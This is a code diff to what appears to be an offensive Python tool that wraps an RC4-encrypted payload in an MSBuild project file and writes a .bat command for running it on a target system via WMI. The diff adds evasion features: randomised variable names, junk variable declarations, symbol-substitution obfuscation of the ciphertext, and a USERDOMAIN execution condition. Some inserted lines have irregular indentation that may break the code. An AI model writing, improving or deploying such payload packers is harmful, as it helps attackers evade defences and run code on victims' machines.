@@ -54,7 +54,7 @@ class Generator:
 		return name[random.randrange(0, len(name) - 1)]
 		
 	def rand_vars(self):
-		for i in reversed(range(1, 50)):
+		for i in reversed(range(1, 100)):
 			self.data = self.data.replace("VAR" + str(i), self.gen_str(random.randrange(5, 25)))
 			
 	def get_output(self):
@@ -122,7 +122,17 @@ class Generator:
 			return data.replace("[CONDITION]", "")
 		else:
 			return data.replace("[CONDITION]", ' Condition="\'$(USERDOMAIN)\'==\'%s\'"' % value)
-
+   	@staticmethod
+    	def gen_pattern(charset):	
+		return ''.join(random.sample(charset,len(charset)))
+	
+	def gen_junk(self):
+		junk = ["int", "var", "float", "decimal", "uint", "double", "long"]
+		data = ""
+		for i in range(0, random.randrange(1, 12)):
+			data += "\t\t\t\t%s %s = %d;\r\n" % (random.choice(junk), self.gen_str(random.randrange(5, 25)), random.randrange(1, 100000))
+			
+		return data
 class RC4:
 
 	def KSA(self, key):
@@ -182,8 +192,15 @@ if __name__ == "__main__":
 		
 		outfile = gen.capture_input("Path for the generated MsBuild out file", 2)
 		cipher = base64.b64encode(rc4.Encrypt(data, key))
+		
+		pattern1 = Generator.gen_pattern("#!@$%?&-~")
+		pattern2 = Generator.gen_pattern(",.<>)(*[]{}`")	
+		cipher = cipher.replace("m", pattern1).replace("V", pattern2)
+
 		output = gen.get_output()
 		output = output.replace("[KEY]", gen.format_rc4_key(key)).replace("[PAYLOAD]", cipher)
+		output = output.replace("[PATTERN_1]", pattern1).replace("[PATTERN_2]", pattern2)
+		output = output.replace("[JUNK1]", gen.gen_junk()).replace("[JUNK2]", gen.gen_junk()).replace("[JUNK3]", gen.gen_junk())
 		condition = gen.capture_input("Set USERDOMAIN condition (Default '')", 4).strip()
 		output = gen.set_condition(output, condition)
 		
@@ -201,9 +218,9 @@ if __name__ == "__main__":
 		try:
 			open(outfile + ".bat", "wb").write(outcmd)
 		except:
-			gen.print_error("Failed to write the output to %s.cmd" % outfile)
+			gen.print_error("Failed to write the output to %s.bat" % outfile)
 
-		print "\n\n[+] %s was generated.\n[+] %s.cmd was generated.\n[+] Run the command inside of %s.cmd on the target system using WMI." % (outfile, outfile, outfile)			
+		print "\n\n[+] %s was generated.\n[+] %s.bat was generated.\n[+] Run the command inside of %s.bat on the target system using WMI." % (outfile, outfile, outfile)			
 	except KeyboardInterrupt:
 			print ""
 			gen.print_error("Exiting")
